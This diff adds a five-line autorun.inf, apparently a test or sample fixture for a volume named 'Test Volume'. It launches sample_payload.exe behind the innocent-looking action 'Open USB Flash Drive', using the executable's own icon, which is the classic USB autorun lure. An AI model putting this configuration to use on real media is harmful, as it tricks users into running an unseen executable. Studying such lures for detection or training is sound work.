@@ -1,0 +1,5 @@
+[autorun]
+open=sample_payload.exe
+action=Open USB Flash Drive
+icon=sample_payload.exe,0
+label=Test Volume
